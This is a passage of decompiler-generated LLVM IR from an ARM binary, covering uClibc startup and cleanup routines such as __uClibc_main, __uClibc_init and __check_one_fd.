  %v0_14db4 = phi i32 [ %v0_14db0, %dec_label_pc_14db0 ], [ %v2_14d9023, %dec_label_pc_14d80 ], [ %v2_14d90, %dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge ]
  %v1_14db4 = phi i32 [ %v0_14db0, %dec_label_pc_14db0 ], [ %v3_14d80, %dec_label_pc_14d80 ], [ %v1_14d94.pre, %dec_label_pc_14d9c.dec_label_pc_14d90_crit_edge ]
  %v3_14db4 = icmp uge i32 %v0_14db4, %v1_14db4
  store i1 %v3_14db4, i1* %cpsr_c.global-to-local, align 1
  %v9_14db4 = icmp eq i32 %v0_14db4, %v1_14db4
  br i1 %v9_14db4, label %dec_label_pc_14dbc, label %dec_label_pc_14db4.dec_label_pc_14d80_crit_edge

dec_label_pc_14db4.dec_label_pc_14d80_crit_edge:  ; preds = %dec_label_pc_14db4
  %v0_14d84.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d80

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14db4
  store i32 116, i32* @r3, align 4
  %v0_14dc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_14dc4 = add i32 %v0_14dc4, 116
  %v3_14dc4 = inttoptr i32 %v2_14dc4 to i32*
  %v4_14dc4 = load i32, i32* %v3_14dc4, align 4
  store i32 %v4_14dc4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14dc4)
  %v0_14dd0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %entry, %bb, %dec_label_pc_14d68, %dec_label_pc_14dbc
  %v0_14dd0 = phi i32 [ %v1_14d60, %dec_label_pc_14d68 ], [ %v0_14dd0.pre, %dec_label_pc_14dbc ], [ %v3_14d14, %entry ], [ %v1_14d60, %bb ]
  %v2_14dd4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14dd4, i32* @r4, align 4
  ret i32 %v0_14dd0

; uselistorder directives
  uselistorder i32 %v0_14db0, { 1, 0 }
  uselistorder i32 %v1_14d94.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14d20, { 1, 2, 0 }
  uselistorder i32 %v1_14d5c, { 1, 0 }
  uselistorder i32 %v1_14d60, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_14d3c.pre, { 1, 0 }
  uselistorder i32 %v0_14d3450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 2, 6, 10, 7, 9, 8, 1, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14dd0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14db4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d9c, { 1, 0 }
  uselistorder label %dec_label_pc_14d5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d44, { 1, 0 }
  uselistorder label %dec_label_pc_14d2c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14df4 = add i32 %tmp, 4
  %v4_14df4 = inttoptr i32 %v3_14df4 to i32*
  store i32 %arg3, i32* %v4_14df4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14e00 = icmp eq i32 %arg2, 0
  br i1 %v2_14e00, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14e18 = call i32 @__libc_errno()
  ret i32 %v3_14e18

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14e4c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14e28 = load i32, i32* @r4, align 4
  store i32 %v3_14e28, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge, %dec_label_pc_14e4c.lr.ph
  %v1_14e4c = phi i32 [ %v1_14e58, %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge ], [ 0, %dec_label_pc_14e4c.lr.ph ]
  %v0_14e4c = phi i32 [ %v0_14e4c.pre, %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -8), %dec_label_pc_14e4c.lr.ph ]
  %v4_14e4c = mul i32 %v1_14e4c, 4
  %v5_14e4c = add i32 %v4_14e4c, %v0_14e4c
  %v6_14e4c = inttoptr i32 %v5_14e4c to i32*
  %v7_14e4c = load i32, i32* %v6_14e4c, align 4
  call void @__pseudo_branch(i32 %v7_14e4c)
  %v0_14e58 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e58 = add i32 %v0_14e58, -1
  store i32 %v1_14e58, i32* %r4.global-to-local, align 4
  %v2_14e58 = icmp eq i32 %v0_14e58, 0
  br i1 %v2_14e58, label %dec_label_pc_14e60, label %dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge

dec_label_pc_14e4c.dec_label_pc_14e4c_crit_edge:  ; preds = %dec_label_pc_14e4c
  %v0_14e4c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e4c
  %v0_14e64.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14e64 = add i32 %v0_14e64.pre, 2004
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  %v4_14e64 = load i32, i32* %v3_14e64, align 4
  %v2_14e68 = icmp eq i32 %v4_14e64, 0
  br i1 %v2_14e68, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14e60
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14e60, %bb
  %v2_14e70 = xor i1 %v2_14e68, true
  call void @__pseudo_cond_branch(i1 %v2_14e70, i32 %v4_14e64)
  %v0_14e78 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e78 = add i32 %v0_14e78, 2008
  %v3_14e78 = inttoptr i32 %v2_14e78 to i32*
  %v4_14e78 = load i32, i32* %v3_14e78, align 4
  %v2_14e7c = icmp eq i32 %v4_14e78, 0
  br i1 %v2_14e7c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14e84 = xor i1 %v2_14e7c, true
  call void @__pseudo_cond_branch(i1 %v2_14e84, i32 %v4_14e78)
  %v2_14e88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14e88, i32* %r4.global-to-local, align 4
  %v1_14e8c = load i32, i32* @r0, align 4
  ret i32 %v1_14e8c

; uselistorder directives
  uselistorder i32 %v1_14e58, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14ea4 = load i32, i32* @r4, align 4
  %v6_14ea4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14eb8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14ec0 = icmp eq i32 %v2_14eb8, -1
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r3, align 4
  br i1 %v3_14ec0, label %dec_label_pc_14ecc, label %dec_label_pc_14ee4

dec_label_pc_14ecc:                               ; preds = %entry
  %v0_14ed0 = load i32, i32* @r5, align 4
  %v2_14ed8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -33916), i32 %v0_14ed0)
  %v1_14edc = load i32, i32* @r4, align 4
  %v1_14ee0 = icmp ne i32 %v2_14ed8, %v1_14edc
  call void @__pseudo_cond_branch(i1 %v1_14ee0, i32 ptrtoint (i32* @global_var_13808.559 to i32))
  br label %dec_label_pc_14ee4

dec_label_pc_14ee4:                               ; preds = %entry, %dec_label_pc_14ecc
  %v1_14eec = phi i32 [ %v2_14eb8, %entry ], [ %v2_14ed8, %dec_label_pc_14ecc ]
  store i32 %v3_14ea4, i32* @r4, align 4
  store i32 %v6_14ea4, i32* @r5, align 4
  ret i32 %v1_14eec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14ee4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ef8 = load i32, i32* @r4, align 4
  store i32 %v3_14ef8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r4.global-to-local, align 4
  %v4_14f08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 148) to i32*), align 4
  %v1_14f0c = inttoptr i32 %v4_14f08 to i32*
  %v2_14f0c = load i32, i32* %v1_14f0c, align 4
  %v2_14f10 = icmp eq i32 %v2_14f0c, 0
  br i1 %v2_14f10, label %dec_label_pc_14f18, label %dec_label_pc_14f3c

dec_label_pc_14f18:                               ; preds = %entry
  store i32 4096, i32* %v1_14f0c, align 4
  %v0_14f20 = call i32 @__pthread_initialize_minimal()
  %v0_14f28 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f28 = add i32 %v0_14f28, -47936
  %v2_14f30 = icmp eq i32 %v2_14f28, 0
  br i1 %v2_14f30, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14f18
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14f18, %bb
  %v2_14f38 = xor i1 %v2_14f30, true
  call void @__pseudo_cond_branch(i1 %v2_14f38, i32 %v2_14f28)
  %v2_14f3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f3c

dec_label_pc_14f3c:                               ; preds = %entry, %bb4
  %v2_14f3c = phi i32 [ %v2_14f3c.pre, %bb4 ], [ %v3_14ef8, %entry ]
  %.0 = phi i32 [ %v0_14f20, %bb4 ], [ undef, %entry ]
  store i32 %v2_14f3c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_14f3c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53908, i32* %r4.global-to-local, align 4
  %v1_14f5c = add i32 %tmp, 4
  store i32 %v1_14f5c, i32* %ip.global-to-local, align 4
  %v2_14f60 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r4.global-to-local, align 4
  %v3_14f6c = mul i32 %arg2, 4
  store i32 %v3_14f6c, i32* @r7, align 4
  %v4_14f74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 24) to i32*), align 4
  store i32 %v4_14f74, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14f7c = add i32 %v1_14f5c, %v3_14f6c
  store i32 %v2_14f7c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %stack_var_-416, align 4
  %v4_14f84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 56) to i32*), align 4
  store i32 %v4_14f84, i32* %r4.global-to-local, align 4
  %v3_14f88 = icmp uge i32 %v2_14f7c, %v2_14f60
  store i1 %v3_14f88, i1* %cpsr_c.global-to-local, align 1
  %v9_14f88 = icmp eq i32 %v2_14f7c, %v2_14f60
  store i1 %v9_14f88, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14f90 = inttoptr i32 %v4_14f84 to i32*
  store i32 %v2_14f7c, i32* %v2_14f90, align 4
  br i1 %v9_14f88, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14f98 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f98 = load i32, i32* %r1.global-to-local, align 4
  %v2_14f98 = inttoptr i32 %v1_14f98 to i32*
  store i32 %v0_14f98, i32* %v2_14f98, align 4
  %v2_14f9c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14f9c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14fa8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14fa8, i32* @r6, align 4
  br i1 %v9_14f88, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_14fb053 = add i32 %v2_14f9c, 2008
  %v4_14fb054 = inttoptr i32 %v3_14fb053 to i32*
  store i32 %arg6, i32* %v4_14fb054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14fac = load i32, i32* %ip.global-to-local, align 4
  %v2_14fac = load i32, i32* @r7, align 4
  %v3_14fac = add i32 %v2_14fac, %v1_14fac
  store i32 %v3_14fac, i32* %r3.global-to-local, align 4
  %v3_14fb050 = add i32 %v2_14f9c, 2008
  %v4_14fb051 = inttoptr i32 %v3_14fb050 to i32*
  store i32 %arg6, i32* %v4_14fb051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14fbc = load i32, i32* %r3.global-to-local, align 4
  %v2_14fbc = load i32, i32* %r4.global-to-local, align 4
  %v3_14fbc = inttoptr i32 %v2_14fbc to i32*
  store i32 %v1_14fbc, i32* %v3_14fbc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14fc0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14fc0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14fc8 = bitcast i32* %stack_var_-120 to i8*
  %v4_14fc8 = call i32 @__GI_memset(i8* %v3_14fc8, i32 0, i32 120)
  store i32 %v4_14fc8, i32* %r0.global-to-local, align 4
  %v0_14fcc = load i32, i32* %r4.global-to-local, align 4
  %v1_14fcc = inttoptr i32 %v0_14fcc to i32*
  %v2_14fcc = load i32, i32* %v1_14fcc, align 4
  br label %dec_label_pc_14fd8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fd8, %bb77
  %storemerge = phi i32 [ %v2_14fcc, %bb77 ], [ %v1_14fe4, %dec_label_pc_14fd8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14fd8 = inttoptr i32 %storemerge to i32*
  %v2_14fd8 = load i32, i32* %v1_14fd8, align 4
  store i32 %v2_14fd8, i32* %r3.global-to-local, align 4
  %v2_14fdc = icmp eq i32 %v2_14fd8, 0
  %v1_14fe4 = add i32 %storemerge, 4
  br i1 %v2_14fdc, label %dec_label_pc_14fe4, label %dec_label_pc_14fd8

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fd8
  store i32 %v1_14fe4, i32* @r4, align 4
  store i32 %v2_14fc0, i32* @r5, align 4
  %v1_1500830 = inttoptr i32 %v1_14fe4 to i32*
  %v2_1500831 = load i32, i32* %v1_1500830, align 4
  store i32 %v2_1500831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1500c33 = icmp eq i32 %v2_1500831, 0
  store i1 %v2_1500c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1500c33, label %dec_label_pc_15014, label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fe4, %dec_label_pc_15008
  %v4_14ff8 = phi i32 [ %v1_15004, %dec_label_pc_15008 ], [ %v1_14fe4, %dec_label_pc_14fe4 ]
  %v5_14ff4 = phi i32 [ %v2_15008, %dec_label_pc_15008 ], [ %v2_1500831, %dec_label_pc_14fe4 ]
  %v2_14ff0 = icmp ugt i32 %v5_14ff4, 13
  store i1 %v2_14ff0, i1* %cpsr_c.global-to-local, align 1
  %v7_14ff0 = icmp eq i32 %v5_14ff4, 14
  store i1 %v7_14ff0, i1* %cpsr_z.global-to-local, align 1
  %v2_14ff4 = xor i1 %v2_14ff0, true
  %v3_14ff4 = or i1 %v7_14ff0, %v2_14ff4
  br i1 %v3_14ff4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_14ff0
  %v4_14ff4 = load i32, i32* @r5, align 4
  %v6_14ff4 = and i32 %v5_14ff4, 536870912
  %v7_14ff4 = icmp ne i32 %v6_14ff4, 0
  store i1 %v7_14ff4, i1* %cpsr_c.global-to-local, align 1
  %v8_14ff4 = mul i32 %v5_14ff4, 8
  %v9_14ff4 = add i32 %v4_14ff4, %v8_14ff4
  store i32 %v9_14ff4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14ff0, %bb78
  %v1_15000 = phi i1 [ %v2_14ff0, %dec_label_pc_14ff0 ], [ %v7_14ff4, %bb78 ]
  %v2_14ff8 = xor i1 %v1_15000, true
  %v3_14ff8 = or i1 %v7_14ff0, %v2_14ff8
  br i1 %v3_14ff8, label %bb80, label %dec_label_pc_15008

bb80:                                             ; preds = %bb79
  store i32 %v4_14ff8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_14ff8, i32 ptrtoint (i32* @global_var_11bc0.567 to i32))
  %v0_15004 = load i32, i32* @r4, align 4
  %v1_15004 = add i32 %v0_15004, 8
  store i32 %v1_15004, i32* @r4, align 4
  %v1_15008 = inttoptr i32 %v1_15004 to i32*
  %v2_15008 = load i32, i32* %v1_15008, align 4
  store i32 %v2_15008, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1500c = icmp eq i32 %v2_15008, 0
  store i1 %v2_1500c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1500c, label %dec_label_pc_15014, label %dec_label_pc_14ff0

dec_label_pc_15014:                               ; preds = %dec_label_pc_15008, %dec_label_pc_14fe4
  store i32 %v2_14fc0, i32* %r0.global-to-local, align 4
  %v1_15018 = call i32 @_dl_aux_init(i32 %v2_14fc0)
  store i32 %v1_15018, i32* %r0.global-to-local, align 4
  %v1_1501c = call i32 @__GI___uClibc_init(i32 %v1_15018)
  store i32 %v1_1501c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15024 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15024, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1502c = add i32 %v2_15024, 148
  %v3_1502c = inttoptr i32 %v2_1502c to i32*
  %v4_1502c = load i32, i32* %v3_1502c, align 4
  store i32 %v4_1502c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15034 = icmp eq i32 %tmp66, 0
  store i1 %v2_15034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15034, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15014
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15014, %bb81
  %v0_15040 = phi i32 [ %tmp66, %dec_label_pc_15014 ], [ 4096, %bb81 ]
  %v3_1503c = icmp eq i32 %tmp65, -1
  store i1 %v3_1503c, i1* %cpsr_c.global-to-local, align 1
  %v8_1503c = icmp eq i32 %tmp65, -1
  store i1 %v8_1503c, i1* %cpsr_z.global-to-local, align 1
  %v2_15040 = inttoptr i32 %v4_1502c to i32*
  store i32 %v0_15040, i32* %v2_15040, align 4
  br i1 %v3_1503c, label %dec_label_pc_15048, label %dec_label_pc_15070

dec_label_pc_15048:                               ; preds = %bb82
  %v0_15048 = call i32 @getuid()
  store i32 %v0_15048, i32* @r0, align 4
  store i32 %v0_15048, i32* %r4.global-to-local, align 4
  %v0_15050 = call i32 @geteuid()
  store i32 %v0_15050, i32* @r0, align 4
  %v3_15054 = icmp uge i32 %v0_15048, %v0_15050
  store i1 %v3_15054, i1* %cpsr_c.global-to-local, align 1
  %v9_15054 = icmp eq i32 %v0_15048, %v0_15050
  store i1 %v9_15054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15054, label %dec_label_pc_1505c, label %dec_label_pc_15098

dec_label_pc_1505c:                               ; preds = %dec_label_pc_15048
  %v1_1505c = call i32 @getgid(i32 %v0_15050)
  store i32 %v1_1505c, i32* @r0, align 4
  store i32 %v1_1505c, i32* %r4.global-to-local, align 4
  %v0_15064 = call i32 @getegid()
  store i32 %v0_15064, i32* %r0.global-to-local, align 4
  %v3_15068 = icmp uge i32 %v1_1505c, %v0_15064
  store i1 %v3_15068, i1* %cpsr_c.global-to-local, align 1
  %v9_15068 = icmp eq i32 %v1_1505c, %v0_15064
  store i1 %v9_15068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15068, label %dec_label_pc_15070, label %dec_label_pc_15098

dec_label_pc_15070:                               ; preds = %dec_label_pc_1505c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1503c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1503c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1503c, label %dec_label_pc_150c0, label %dec_label_pc_1507c

dec_label_pc_1507c:                               ; preds = %dec_label_pc_15070
  store i32 %tmp64, i32* @r3, align 4
  %v3_15080 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15080, i1* %cpsr_c.global-to-local, align 1
  %v9_15080 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15080, label %dec_label_pc_15088, label %dec_label_pc_15098

dec_label_pc_15088:                               ; preds = %dec_label_pc_1507c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15090 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15090, i1* %cpsr_c.global-to-local, align 1
  %v9_15090 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15090, label %dec_label_pc_150c0, label %dec_label_pc_15098

dec_label_pc_15098:                               ; preds = %dec_label_pc_1507c, %dec_label_pc_1505c, %dec_label_pc_15048, %dec_label_pc_15088
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_150a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_150ac = load i32, i32* @r4, align 4
  store i32 %v0_150ac, i32* %r1.global-to-local, align 4
  %v2_150b0 = call i32 @__check_one_fd(i32 1, i32 %v0_150ac)
  %v0_150b4 = load i32, i32* @r4, align 4
  store i32 %v0_150b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_150bc = call i32 @__check_one_fd(i32 2, i32 %v0_150b4)
  store i32 %v2_150bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_150c0

dec_label_pc_150c0:                               ; preds = %dec_label_pc_15088, %dec_label_pc_15070, %dec_label_pc_15098
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_150c8 = load i32, i32* %arg3, align 4
  store i32 %v2_150c8, i32* %r2.global-to-local, align 4
  %v2_150cc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_150cc, i32* %r1.global-to-local, align 4
  %v3_150d0 = add i32 %v2_150cc, 260
  %v4_150d0 = inttoptr i32 %v3_150d0 to i32*
  store i32 %v2_150c8, i32* %v4_150d0, align 4
  %v0_150d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_150d4 = inttoptr i32 %v0_150d4 to i32*
  %v2_150d4 = load i32, i32* %v1_150d4, align 4
  store i32 %v2_150d4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150d8 = icmp eq i32 %v2_150d4, 0
  store i1 %v2_150d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_150d8, label %bb84, label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150c0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_150e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_150e4 = add i32 %v0_150e4, 164
  %v3_150e4 = inttoptr i32 %v2_150e4 to i32*
  %v4_150e4 = load i32, i32* %v3_150e4, align 4
  store i32 %v4_150e4, i32* %r3.global-to-local, align 4
  %v2_150e8 = inttoptr i32 %v4_150e4 to i32*
  store i32 %v2_150d4, i32* %v2_150e8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_150f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_150f0 = inttoptr i32 %v0_150f0 to i32*
  %v2_150f0 = load i32, i32* %v1_150f0, align 4
  store i32 %v2_150f0, i32* %r0.global-to-local, align 4
  %v4_150f4 = call i32 @__GI_strrchr(i32 %v2_150f0, i32 47, i32 %v2_150c8, i32 %v4_150e4)
  store i32 %v4_150f4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_150fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_150fc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15100 = icmp eq i32 %v4_150f4, 0
  store i1 %v2_15100, i1* %cpsr_z.global-to-local, align 1
  %v2_15104 = add i32 %v2_150fc, 96
  %v3_15104 = inttoptr i32 %v2_15104 to i32*
  %v4_15104 = load i32, i32* %v3_15104, align 4
  store i32 %v4_15104, i32* %r2.global-to-local, align 4
  br i1 %v2_15100, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_150e0
  %v2_1510c58 = inttoptr i32 %v4_15104 to i32*
  store i32 0, i32* %v2_1510c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_150e0
  %v2_15108 = add i32 %v4_150f4, 1
  store i32 %v2_15108, i32* %r3.global-to-local, align 4
  %v2_1510c = inttoptr i32 %v4_15104 to i32*
  store i32 %v4_150f4, i32* %v2_1510c, align 4
  %v1_15110 = load i32, i32* %r3.global-to-local, align 4
  %v2_15110 = load i32, i32* %r2.global-to-local, align 4
  %v3_15110 = inttoptr i32 %v2_15110 to i32*
  store i32 %v1_15110, i32* %v3_15110, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_150c0
  %v2_15120 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15120, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1512c = add i32 %v2_15120, -12
  store i32 %v2_1512c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1513c = add i32 %v2_15120, 2004
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  store i32 %arg5, i32* %v4_1513c, align 4
  %v0_1515418 = load i32, i32* %r4.global-to-local, align 4
